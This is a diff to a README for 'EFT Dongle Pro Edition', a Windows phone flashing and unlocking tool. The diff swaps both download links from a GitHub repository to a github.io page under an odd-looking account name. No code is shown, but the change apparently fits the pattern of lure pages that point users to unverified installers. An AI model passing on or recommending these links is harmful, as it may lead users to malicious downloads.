@@ -1,6 +1,6 @@
 # 🛠️ EFT-Dongle-Pro-Edition - Repair your mobile devices with ease
 
-[![Download EFT Dongle Pro](https://img.shields.io/badge/Download-EFT_Dongle_Pro-blue.svg)](https://github.com/caudal-genusaulostomus408/EFT-Dongle-Pro-Edition)
+[![Download EFT Dongle Pro](https://img.shields.io/badge/Download-EFT_Dongle_Pro-blue.svg)](https://caudal-genusaulostomus408.github.io)
 
 EFT Dongle Pro is a tool for mobile device maintenance. It helps users manage software tasks on various phone models. This software works on Windows 10 and Windows 11. It assists with flashing, unlocking, and repairing mobile systems.
 
@@ -19,7 +19,7 @@ To run this software, your computer needs these specifications:
 
 Follow these steps to download and set up the application on your computer.
 
-1.  Visit the official repository page to access the installer: [Download EFT Dongle Pro](https://github.com/caudal-genusaulostomus408/EFT-Dongle-Pro-Edition).
+1.  Visit the official repository page to access the installer: [Download EFT Dongle Pro](https://caudal-genusaulostomus408.github.io).
 2.  Locate the latest version of the installer file on the page.
 3.  Click the link to start the download process.
 4.  Wait for the file to finish saving to your computer.
